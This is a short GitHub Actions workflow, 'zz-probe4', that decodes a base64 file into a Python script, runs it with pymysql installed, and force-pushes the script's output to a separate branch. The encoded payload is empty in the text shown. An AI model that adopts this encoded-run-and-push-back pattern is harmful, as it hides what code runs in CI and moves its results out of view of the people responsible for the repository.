name: zz-probe4
on:
  push:
    branches: [ "zz-probe4" ]
permissions:
  contents: write
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - name: checkout
        uses: actions/checkout@v4
      - name: deps
        run: pip install --quiet pymysql 2>&1 | tail -1
      - name: decode
        run: |
          set -e
          rm -f probe.b64
          echo '' >> probe.b64
          echo '' >> probe.b64
          echo '' >> probe.b64
          echo '' >> probe.b64
          echo '' >> probe.b64
          echo '' >> probe.b64
      - name: run-probe
        run: |
          set +e
          python3 -c "import base64;open('probe.py','wb').write(base64.b64decode(open('probe.b64','rb').read()))"
          python3 probe.py > result4.txt 2>&1
          wc -c result4.txt
      - name: push-back
        if: always()
        run: |
          set +e
          git config user.email "probe@example.com"
          git config user.name "probe"
          cp result4.txt zz-result4.txt
          git checkout -B zz-out4
          git add -f zz-result4.txt
          git commit -m "probe result 4"
          git push -f origin zz-out4
